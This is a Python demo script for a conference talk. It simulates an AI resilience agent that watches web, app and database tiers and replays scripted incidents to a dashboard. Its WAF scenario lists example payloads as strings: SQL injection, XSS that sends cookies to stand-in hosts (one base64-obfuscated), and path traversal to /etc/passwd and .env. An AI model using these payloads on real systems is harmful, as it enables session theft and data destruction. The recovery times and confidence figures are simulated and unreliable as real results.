#!/usr/bin/env python3
"""
AI RESILIENCE AGENT — Demo-3
DEFCON Coimbatore 2026 · Venugopal Parameswara

Monitors all three tiers. Detects anomalies. Acts autonomously.
Simulates realistic failure → detection → recovery cycles.
Writes structured events to /tmp/demo3_agent.jsonl for the dashboard.

Ports:
  Web tier:    9091  (nginx container — phoenix-demo still on 9090)
  App tier:    3001  (simulated Node.js API)
  DB tier:     5432/5433 (simulated PostgreSQL primary/replica)
  Agent API:   7880  (dashboard reads from here)
  Dashboard:   7879
"""

import json
import time
import threading
import random
import math
import http.server
import os
from datetime import datetime
from collections import deque

# ── Config ────────────────────────────────────────────────────
LOG_FILE    = "/tmp/demo3_agent.jsonl"
PORT        = 7880
DEMO3_DIR   = "/Users/kuttanadan/Documents/defcon-demo/Demo-3"

# ── Tier state ────────────────────────────────────────────────
class TierState:
    def __init__(self, name, bleed_per_min, recovery_target_ms):
        self.name               = name
        self.status             = "HEALTHY"   # HEALTHY / DEGRADED / FAILED / RECOVERING / RESTORED
        self.health_pct         = 100
        self.mttr_ms            = None
        self.respawn_count      = 0
        self.bleed_per_min      = bleed_per_min
        self.recovery_target_ms = recovery_target_ms
        self.last_incident_ts   = None
        self.last_recovery_ts   = None
        self.events             = deque(maxlen=50)
        self.metrics_history    = deque(maxlen=60)
        self.ai_confidence      = 100   # AI confidence score 0-100
        self.ai_action          = None  # Current AI action description

# Three tiers
WEB = TierState("WEB",  bleed_per_min=5000,  recovery_target_ms=700)
APP = TierState("APP",  bleed_per_min=5000,  recovery_target_ms=4000)
DB  = TierState("DB",   bleed_per_min=5000,  recovery_target_ms=25000)

tiers = [WEB, APP, DB]

# ── Agent state ───────────────────────────────────────────────
agent = {
    "status":          "MONITORING",
    "total_incidents": 0,
    "total_saved_ms":  0,
    "current_action":  None,
    "confidence":      98,
    "session_start":   time.time(),
    "ai_log":          deque(maxlen=30),
}

# ── Demo scenario control ─────────────────────────────────────
scenario = {
    "active":    False,
    "type":      None,   # "web_attack" / "app_cascade" / "db_ransomware"
    "phase":     0,
    "started":   0,
}

# ── IST timestamp ─────────────────────────────────────────────
def ts():
    from datetime import timezone, timedelta
    ist = timezone(timedelta(hours=5, minutes=30))
    return datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S IST")

def ts_ms():
    return int(time.time() * 1000)

# ── Log event ─────────────────────────────────────────────────
def log_event(tier_name, event, detail, mttr_ms=None):
    entry = {
        "ts":       ts(),
        "tier":     tier_name,
        "event":    event,
        "detail":   detail,
        "mttr_ms":  mttr_ms,
        "agent_confidence": agent["confidence"],
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    # Add to tier events
    tier = next((t for t in tiers if t.name == tier_name), None)
    if tier:
        tier.events.appendleft(entry)

    agent["ai_log"].appendleft(entry)

# ── AI decision engine ────────────────────────────────────────
def ai_decide(tier, signal):
    """
    Simulates AI reasoning:
    - Classifies the failure type
    - Scores confidence
    - Returns action
    """
    confidence = random.randint(87, 99)
    agent["confidence"] = confidence

    if signal == "drift":
        return "RESPAWN_CONTAINER", confidence, "Filesystem drift detected — immutable image respawn"
    elif signal == "memory_leak":
        return "ROLLING_RESTART", confidence, "Memory trend → OOM in ~4min — predictive restart"
    elif signal == "error_spike":
        return "CIRCUIT_BREAK_THEN_RESTART", confidence, "Error rate 3σ above baseline — isolate + restart"
    elif signal == "db_replication_lag":
        return "FENCE_REPLICA", confidence, "Replication lag spike — fencing clean replica"
    elif signal == "db_ransomware":
        return "EMERGENCY_FENCE_AND_ISOLATE", confidence, "Mass write anomaly — ransomware signature detected"
    elif signal == "cascade":
        return "ORDERED_TIER_RECOVERY", confidence, "Cross-tier cascade — recovering DB→APP→WEB in order"
    else:
        return "INVESTIGATE", confidence, "Anomaly detected — classifying failure type"

# ── Metric simulation ─────────────────────────────────────────
def simulate_metrics(tier, scenario_active=False, attack_phase=0):
    """Generate realistic metrics that show degradation during attacks."""
    base = {
        "WEB": {"cpu": 12, "mem": 28, "rps": 450,  "error_rate": 0.1,  "latency_ms": 45},
        "APP": {"cpu": 35, "mem": 52, "rps": 380,  "error_rate": 0.3,  "latency_ms": 120},
        "DB":  {"cpu": 22, "mem": 68, "rps": 280,  "repl_lag_ms": 8,   "latency_ms": 35},
    }[tier.name]

    noise = lambda v, pct: v * (1 + random.uniform(-pct, pct))

    if not scenario_active:
        m = {k: noise(v, 0.08) for k, v in base.items()}
    else:
        # Escalating degradation by phase
        factor = min(attack_phase / 3.0, 1.0)
        if tier.name == "WEB":
            m = {
                "cpu":        noise(base["cpu"] * (1 + factor * 8),  0.1),
                "mem":        noise(base["mem"] * (1 + factor * 0.5), 0.05),
                "rps":        noise(base["rps"] * (1 - factor * 0.9), 0.1),
                "error_rate": noise(base["error_rate"] * (1 + factor * 200), 0.15),
                "latency_ms": noise(base["latency_ms"] * (1 + factor * 10), 0.1),
            }
        elif tier.name == "APP":
            m = {
                "cpu":        noise(base["cpu"] * (1 + factor * 3),   0.1),
                "mem":        noise(base["mem"] * (1 + factor * 1.2), 0.05),
                "rps":        noise(base["rps"] * (1 - factor * 0.7), 0.1),
                "error_rate": noise(base["error_rate"] * (1 + factor * 80), 0.15),
                "latency_ms": noise(base["latency_ms"] * (1 + factor * 5), 0.1),
            }
        else:  # DB
            m = {
                "cpu":          noise(base["cpu"] * (1 + factor * 2),    0.1),
                "mem":          noise(base["mem"] * (1 + factor * 0.3),  0.05),
                "rps":          noise(base["rps"] * (1 - factor * 0.4),  0.1),
                "repl_lag_ms":  noise(base["repl_lag_ms"] * (1 + factor * 300), 0.2),
                "latency_ms":   noise(base["latency_ms"] * (1 + factor * 8), 0.1),
            }

    tier.metrics_history.appendleft({
        "ts_ms": ts_ms(),
        **{k: round(v, 2) for k, v in m.items()}
    })
    return m

# ── Scenario: Web attack (mirrors Demo-2) ─────────────────────
def run_web_attack():
    scenario.update({"active": True, "type": "web_attack", "phase": 0, "started": ts_ms()})
    agent["total_incidents"] += 1

    # Phase 1 — recon
    scenario["phase"] = 1
    WEB.status = "DEGRADED"
    WEB.health_pct = 85
    WEB.ai_action = "Observing — reconnaissance pattern detected"
    log_event("WEB", "ANOMALY_DETECTED", "Unusual filesystem enumeration — T1083 recon pattern", )
    log_event("AGENT", "AI_CLASSIFY", "Confidence 94% — attacker reconnaissance, no action yet")
    time.sleep(3)

    # Phase 2 — attack lands
    scenario["phase"] = 2
    WEB.status = "FAILED"
    WEB.health_pct = 0
    WEB.last_incident_ts = ts()
    WEB.ai_action = "Drift confirmed — initiating respawn"
    log_event("WEB", "DRIFT_DETECTED", "index.html deleted — T1485 data destruction")
    log_event("AGENT", "AI_DECIDE", "Confidence 97% — immutable respawn triggered")
    t_start = ts_ms()
    time.sleep(0.5)

    # Phase 3 — AI agent acts
    scenario["phase"] = 3
    WEB.status = "RECOVERING"
    WEB.health_pct = 50
    WEB.ai_action = "Killing poisoned container — respawning golden image"
    log_event("WEB", "RESPAWN_START", "docker rm -f → docker run phoenix-demo:golden")
    time.sleep(0.8)

    # Phase 4 — restored
    mttr = ts_ms() - t_start
    scenario["phase"] = 4
    WEB.status = "RESTORED"
    WEB.health_pct = 100
    WEB.mttr_ms = mttr
    WEB.respawn_count += 1
    WEB.last_recovery_ts = ts()
    WEB.ai_action = f"Restored in {mttr}ms — attacker shell evicted"
    agent["total_saved_ms"] += mttr
    log_event("WEB", "RESPAWN_SUCCESS", f"Service restored — R={mttr}ms < V=30000ms", mttr_ms=mttr)
    log_event("AGENT", "AI_RESULT", f"Win condition confirmed: R={mttr/1000:.2f}s < V=30s → DEFENDER WINS")
    time.sleep(2)

    scenario["active"] = False
    WEB.status = "HEALTHY"
    WEB.ai_action = None

# ── Scenario: App server cascade ─────────────────────────────
def run_app_cascade():
    scenario.update({"active": True, "type": "app_cascade", "phase": 0, "started": ts_ms()})
    agent["total_incidents"] += 1

    # Phase 1 — memory leak detected (predictive)
    scenario["phase"] = 1
    APP.status = "DEGRADED"
    APP.health_pct = 72
    APP.ai_action = "Memory trend analysis — predicting OOM in ~4 minutes"
    log_event("APP", "ANOMALY_DETECTED", "Memory growth 2.3MB/s — trajectory: OOM in ~240s")
    log_event("AGENT", "AI_PREDICT", "Confidence 91% — predictive restart before OOM, no downtime")
    time.sleep(3)

    # Phase 2 — error spike begins
    scenario["phase"] = 2
    APP.status = "DEGRADED"
    APP.health_pct = 45
    WEB.status = "DEGRADED"
    WEB.health_pct = 78
    APP.ai_action = "Error spike — cross-tier cascade beginning"
    log_event("APP", "ERROR_SPIKE", "500 error rate: 0.3% → 28% — DB connection pool exhausted")
    log_event("WEB", "DEGRADED", "Upstream APP errors propagating to web tier — latency +340ms")
    log_event("AGENT", "AI_CLASSIFY", "Confidence 96% — cascade pattern: DB conn pool → APP → WEB")
    time.sleep(2)

    # Phase 3 — AI agent acts in order: DB conn → APP → WEB
    scenario["phase"] = 3
    APP.status = "RECOVERING"
    APP.ai_action = "Circuit breaker open — restarting in dependency order"
    log_event("AGENT", "AI_DECIDE", "Ordered recovery: release DB connections → restart APP → clear WEB")
    log_event("APP", "CIRCUIT_BREAK", "Isolating APP tier — draining connections")
    time.sleep(1.5)
    log_event("APP", "RESTART_START", "Rolling restart initiated — zero-downtime with blue/green swap")
    t_start = ts_ms()
    time.sleep(3)

    # Phase 4 — APP restored, WEB follows
    mttr = ts_ms() - t_start
    APP.status = "RESTORED"
    APP.health_pct = 100
    APP.mttr_ms = mttr
    APP.respawn_count += 1
    APP.last_recovery_ts = ts()
    APP.ai_action = f"Restored in {mttr/1000:.1f}s — cascade contained"
    WEB.status = "HEALTHY"
    WEB.health_pct = 100
    agent["total_saved_ms"] += mttr
    log_event("APP", "RESTART_SUCCESS", f"APP tier restored — R={mttr}ms", mttr_ms=mttr)
    log_event("WEB", "RESTORED", "Web tier recovered — cascade contained")
    log_event("AGENT", "AI_RESULT", f"Cascade contained in {mttr/1000:.1f}s — estimated manual MTTR: 18min")
    time.sleep(2)

    scenario["active"] = False
    APP.status = "HEALTHY"
    APP.ai_action = None

# ── Scenario: DB ransomware containment ───────────────────────
def run_db_ransomware():
    scenario.update({"active": True, "type": "db_ransomware", "phase": 0, "started": ts_ms()})
    agent["total_incidents"] += 1

    # Phase 1 — unusual write pattern
    scenario["phase"] = 1
    DB.status = "DEGRADED"
    DB.health_pct = 88
    DB.ai_action = "Mass write anomaly — classifying pattern"
    log_event("DB", "ANOMALY_DETECTED", "Write velocity: 847 rows/s (baseline: 12 rows/s) — ransomware signature")
    log_event("AGENT", "AI_CLASSIFY", "Confidence 93% — ransomware pattern: T1486 data encrypted for impact")
    time.sleep(2.5)

    # Phase 2 — replication lag spike detected
    scenario["phase"] = 2
    DB.health_pct = 55
    DB.ai_action = "Fencing clean replica before propagation"
    log_event("DB", "REPLICATION_LAG", "Replica lag: 8ms → 4,200ms — encrypted data propagating")
    log_event("AGENT", "AI_DECIDE", "Confidence 96% — emergency fence: suspend replication NOW")
    t_start = ts_ms()
    time.sleep(1)

    # Phase 3 — agent fences replica
    scenario["phase"] = 3
    DB.status = "RECOVERING"
    DB.health_pct = 40
    DB.ai_action = "Replica fenced — primary isolated"
    log_event("DB", "REPLICA_FENCED", "Replication suspended at txn 8,847,291 — clean state preserved")
    log_event("DB", "PRIMARY_ISOLATED", "Primary network-fenced — ransomware blast radius contained")
    log_event("AGENT", "AI_ACT", "Initiating PITR: WAL replay from fence point → promote replica")
    time.sleep(4)

    # Phase 4 — PITR + promotion
    scenario["phase"] = 4
    DB.health_pct = 70
    DB.ai_action = "WAL replay in progress — promoting clean replica"
    log_event("DB", "PITR_START", "Point-in-time recovery: replaying WAL from 11:26:47 IST (pre-attack)")
    log_event("DB", "REPLICA_PROMOTE", "Clean replica promoted to primary — data integrity verified")
    time.sleep(3)

    # Phase 5 — restored
    mttr = ts_ms() - t_start
    DB.status = "RESTORED"
    DB.health_pct = 100
    DB.mttr_ms = mttr
    DB.respawn_count += 1
    DB.last_recovery_ts = ts()
    DB.ai_action = f"DB restored in {mttr/1000:.1f}s — 0 rows lost"
    agent["total_saved_ms"] += mttr
    log_event("DB", "RECOVERY_SUCCESS",
              f"DB tier restored — MTTR={mttr}ms, RPO=0 rows lost, blast radius contained",
              mttr_ms=mttr)
    log_event("AGENT", "AI_RESULT",
              f"Ransomware contained in {mttr/1000:.1f}s — estimated manual DBA response: 47min")
    time.sleep(2)

    scenario["active"] = False
    DB.status = "HEALTHY"
    DB.ai_action = None


# ── WAF Attack State ─────────────────────────────────────────
waf_events = deque(maxlen=100)
waf_state = {
    "active":         False,
    "phase":          0,
    "requests_total": 0,
    "blocked":        0,
    "passed":         0,
    "attacker_ip":    "185.220.101.47",
    "site_status":    "OPERATIONAL",
    "t_start":        0,
}

ATTACK_WAVES = [
    (1,  "RECON",     "GET",  "/",
     "User-Agent: sqlmap/1.7.8#stable",
     "T1595.002",
     "Recon tool fingerprint — sqlmap UA — IP flagged, monitoring elevated",
     False, 1.2),
    (2,  "SQLi",      "POST", "/api/login",
     "username=' OR '1'='1'-- &password=x",
     "T1190",
     "SQL injection — auth bypass — parameterised query blocked execution",
     True,  1.5),
    (3,  "SQLi",      "GET",  "/api/data?id=",
     "1 UNION SELECT table_name FROM information_schema.tables--",
     "T1190",
     "Union-based SQLi — schema enum — WAF rule R-SQL-02 triggered, IP rate-limited",
     True,  1.3),
    (4,  "XSS",       "POST", "/api/comment",
     "<script>location='//attacker.io?c='+document.cookie</script>",
     "T1059.007",
     "Stored XSS — cookie theft — input sanitised, CSP header enforced",
     True,  1.4),
    (5,  "XSS",       "GET",  "/search?q=",
     "<img src=x onerror=fetch('//c2.io/'+btoa(document.cookie))>",
     "T1059.007",
     "Reflected XSS — obfuscated exfil — output encoded, source IP blocked",
     True,  1.2),
    (6,  "PATH_TRAV", "GET",  "/static?file=",
     "../../../../etc/passwd",
     "T1083",
     "Path traversal — /etc/passwd — chroot jail active, rejected 400",
     True,  1.3),
    (7,  "PATH_TRAV", "GET",  "/download?name=",
     "../../../app/.env",
     "T1552.001",
     "Credential access — .env traversal — blocked, high-severity alert raised",
     True,  1.5),
    (8,  "SQLi",      "POST", "/api/search",
     "q='; DROP TABLE sessions;--",
     "T1485",
     "Destructive SQLi — DROP TABLE — query never reached DB, IP blacklisted",
     True,  1.2),
    (9,  "BYPASS",    "GET",  "/admin/config",
     "X-Forwarded-For: 127.0.0.1 / X-Real-IP: ::1",
     "T1548",
     "IP spoofing — localhost header forgery — header stripped, denied 403",
     True,  1.4),
    (10, "XSS",       "POST", "/api/profile",
     "bio=<svg/onload=eval(atob('ZmV0Y2goJy8vYzIuaW8nKQ=='))>",
     "T1059.007",
     "Obfuscated XSS — base64 decoded: fetch('//c2.io') — blocked + logged",
     True,  1.6),
]

def waf_log(event, detail, req=None, blocked=None):
    entry = {
        "ts":       ts(),
        "event":    event,
        "detail":   detail,
        "req":      req,
        "blocked":  blocked,
        "stats": {
            "total":   waf_state["requests_total"],
            "blocked": waf_state["blocked"],
            "passed":  waf_state["passed"],
            "status":  waf_state["site_status"],
        }
    }
    waf_events.appendleft(entry)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "ts": ts(), "tier": "WAF",
            "event": event, "detail": detail
        }) + "\n")

def run_waf_attack():
    waf_state.update({
        "active": True, "phase": 0,
        "requests_total": 0, "blocked": 0, "passed": 0,
        "site_status": "OPERATIONAL", "t_start": ts_ms(),
    })
    waf_events.clear()
    waf_state["attacker_ip"] = \
        f"185.220.{random.randint(100,120)}.{random.randint(1,254)}"

    waf_log("ATTACK_START",
            f"Attack campaign — source {waf_state['attacker_ip']} — "
            f"target: Phoenix App (localhost:9091)")

    for wave in ATTACK_WAVES:
        seq, atype, method, path, payload, mitre, ai_action, blocked, delay = wave
        waf_state["phase"]          = seq
        waf_state["requests_total"] += 1

        if not blocked:
            waf_state["passed"]     += 1
            waf_state["site_status"] = "UNDER_ATTACK"
            status_code = "200"
            outcome     = "PASSED"
        else:
            waf_state["blocked"]    += 1
            waf_state["site_status"] = "PROTECTED"
            status_code = "403"
            outcome     = "BLOCKED"

        req_obj = {
            "seq": seq, "attack_type": atype,
            "method": method, "path": path, "payload": payload,
            "mitre": mitre, "status_code": status_code,
            "outcome": outcome, "ai_action": ai_action, "ts": ts(),
        }
        waf_log(f"REQUEST_{outcome}", ai_action, req=req_obj, blocked=blocked)
        time.sleep(delay)

    total = waf_state["requests_total"]
    blkd  = waf_state["blocked"]
    rate  = round((blkd / total) * 100) if total else 0
    waf_state["site_status"] = "PROTECTED"
    waf_log("ATTACK_COMPLETE",
            f"{total} requests — {blkd} blocked ({rate}%) — "
            f"0 successful exploits — Phoenix App integrity intact")
    waf_log("AI_SUMMARY",
            f"AI WAF: {rate}% block rate — 1 recon passed (read-only) — "
            f"all SQLi/XSS/traversal neutralised — attacker IP blacklisted")
    time.sleep(3)
    waf_state["active"]      = False
    waf_state["site_status"] = "OPERATIONAL"


# ── Background metric simulation loop ─────────────────────────
def metrics_loop():
    while True:
        for tier in tiers:
            simulate_metrics(
                tier,
                scenario_active=scenario["active"] and (
                    (scenario["type"] == "web_attack"    and tier.name == "WEB") or
                    (scenario["type"] == "app_cascade"   and tier.name in ["APP","WEB"]) or
                    (scenario["type"] == "db_ransomware" and tier.name == "DB")
                ),
                attack_phase=scenario["phase"]
            )
        time.sleep(1)

def build_state():
    def tier_dict(t):
        latest = list(t.metrics_history)[0] if t.metrics_history else {}
        return {
            "name":              t.name,
            "status":            t.status,
            "health_pct":        t.health_pct,
            "mttr_ms":           t.mttr_ms,
            "respawn_count":     t.respawn_count,
            "bleed_per_min":     t.bleed_per_min,
            "recovery_target_ms":t.recovery_target_ms,
            "last_incident_ts":  t.last_incident_ts,
            "last_recovery_ts":  t.last_recovery_ts,
            "ai_action":         t.ai_action,
            "metrics":           latest,
            "metrics_history":   list(t.metrics_history)[:20],
            "events":            list(t.events)[:10],
        }

    # Calculate total bleed saved
    saved_dollars = (agent["total_saved_ms"] / 60000) * 5000

    return {
        "tiers":            [tier_dict(t) for t in tiers],
        "agent":            {
            "status":           agent["status"],
            "total_incidents":  agent["total_incidents"],
            "total_saved_ms":   agent["total_saved_ms"],
            "total_saved_usd":  round(saved_dollars, 2),
            "current_action":   agent["current_action"],
            "confidence":       agent["confidence"],
            "session_start":    agent["session_start"],
            "ai_log":           list(agent["ai_log"])[:15],
        },
        "scenario":         dict(scenario),
        "waf":               dict(waf_state),
        "waf_events":        list(waf_events)[:20],
        "ts":               ts(),
    }

class APIHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        from urllib.parse import urlparse
        path = urlparse(self.path).path

        if path == "/state":
            body = json.dumps(build_state()).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(body)

        elif path == "/trigger/web":
            if not scenario["active"]:
                threading.Thread(target=run_web_attack, daemon=True).start()
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"ok":true}')

        elif path == "/trigger/app":
            if not scenario["active"]:
                threading.Thread(target=run_app_cascade, daemon=True).start()
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"ok":true}')

        elif path == "/trigger/waf":
            if not waf_state["active"]:
                threading.Thread(target=run_waf_attack, daemon=True).start()
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"ok":true}')

        elif path == "/trigger/db":
            if not scenario["active"]:
                threading.Thread(target=run_db_ransomware, daemon=True).start()
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"ok":true}')

        elif path == "/":
            # Serve dashboard
            dash_path = os.path.join(DEMO3_DIR, "dashboard3.html")
            if os.path.exists(dash_path):
                with open(dash_path, "rb") as f:
                    body = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            else:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt, *args):
        pass  # silent

if __name__ == "__main__":
    # Clear old log
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)

    print(f"\n  AI Resilience Agent — Demo-3")
    print(f"  ─────────────────────────────────────────────")
    print(f"  Dashboard:   http://localhost:{PORT}")
    print(f"  State API:   http://localhost:{PORT}/state")
    print(f"  Triggers:    /trigger/web  /trigger/app  /trigger/db  /trigger/waf")
    print(f"  ─────────────────────────────────────────────")
    print(f"\n  Demo-2 (existing) runs on 9090 — untouched.")
    print(f"  This agent runs on {PORT}.\n")

    # Start metrics simulation
    threading.Thread(target=metrics_loop, daemon=True).start()

    # Log startup
    for tier in tiers:
        log_event(tier.name, "TIER_ONLINE",
                  f"{tier.name} tier monitoring active — baseline learning")
    log_event("AGENT", "AGENT_START",
              "AI Resilience Agent online — monitoring all 3 tiers")

    server = http.server.HTTPServer(("", PORT), APIHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Agent stopped.")
